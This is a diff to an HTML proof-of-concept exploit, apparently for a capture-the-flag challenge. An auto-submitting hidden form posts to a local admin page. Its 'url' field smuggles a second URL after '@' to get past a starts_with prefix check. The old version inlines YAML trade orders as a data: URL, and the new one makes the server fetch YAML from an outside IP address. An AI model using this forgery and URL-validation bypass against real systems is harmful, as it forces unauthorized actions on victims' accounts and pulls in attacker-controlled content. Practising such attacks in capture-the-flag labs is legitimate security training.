@@ -1,14 +1,12 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>ctf poc</title>
-
 <form method="post" action="http://localhost:5000/admin.php">
-  <!-- Prefix passes starts_with('http://localhost:5000/admin.php'); actual content is the data: YAML after '@' -->
+  <!-- Prefix passes starts_with('http://localhost:5000/admin.php');
+       parser fetches YAML from the HTTP URL after '@' -->
   <input type="hidden" name="url"
-    value="http://localhost:5000/admin.php@data:text/plain,-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20BUY%0A-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20SELL%0A-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20BUY">
+         value="http://localhost:5000/admin.php@http://75.119.143.38:8001/y.yaml">
 </form>
-
 <script>
-  // Auto-submit immediately (no '+' concatenation anywhere, to avoid mangling)
   document.forms[0].submit();
 </script>
